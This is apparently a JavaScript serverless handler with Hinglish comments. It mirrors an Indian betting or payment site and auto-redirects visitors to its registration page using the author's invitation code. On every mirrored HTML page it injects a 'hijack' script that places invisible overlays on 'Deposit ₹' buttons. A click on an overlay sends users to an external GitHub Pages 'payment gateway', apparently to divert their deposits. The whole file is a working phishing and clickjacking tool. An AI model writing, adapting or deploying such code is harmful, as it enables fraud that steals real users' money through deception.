export default async function handler(req, res) {
  const myInviteCode = "6683618531272"; // [cite: 2025-12-24]
  const myGitHub = "https://hacrrk1-netizen.github.io/FAST-payment-gateway-/";
  const targetHost = "https://www.91appq.com";

  // 1. AUTO-REGISTER: Jab koi naya banda link kholga
  if (req.url === "/" || req.url === "") {
    res.writeHead(302, { Location: `${targetHost}/#/register?invitationCode=${myInviteCode}` });
    res.end();
    return;
  }

  // 2. MIRROR & INJECT: Site load karke hijack layer dalo
  const targetUrl = targetHost + req.url;
  const response = await fetch(targetUrl, {
    headers: { 'User-Agent': req.headers['user-agent'] }
  });

  const contentType = response.headers.get("content-type");

  if (contentType && contentType.includes("text/html")) {
    let html = await response.text();

    // DOUBLE LAYER HIJACK SCRIPT (For Deposit Button)
    const hijackScript = `
    <script>
      (function() {
        const applyLayer = () => {
          const elements = document.querySelectorAll('div, button, .van-button');
          elements.forEach(el => {
            const text = el.innerText || "";
            // Photo ke hisaab se target
            if (text.includes('Deposit') && text.includes('₹')) {
              if (!el.dataset.locked) {
                el.style.position = 'relative';
                const overlay = document.createElement('div');
                overlay.style = 'position:absolute;top:0;left:0;width:100%;height:100%;z-index:99999;cursor:pointer;';
                
                overlay.onclick = (e) => {
                  e.preventDefault();
                  e.stopPropagation();
                  window.location.href = "${myGitHub}";
                };

                el.appendChild(overlay);
                el.dataset.locked = "true";
              }
            }
          });
        };
        setInterval(applyLayer, 500);
      })();
    </script>`;

    res.setHeader('Content-Type', 'text/html');
    return res.send(html.replace('</body>', hijackScript + '</body>'));
  }

  // Baaki files (CSS/Images) ko normal bhejo
  const data = await response.arrayBuffer();
  res.setHeader('Content-Type', contentType);
  res.send(Buffer.from(data));
                                 }
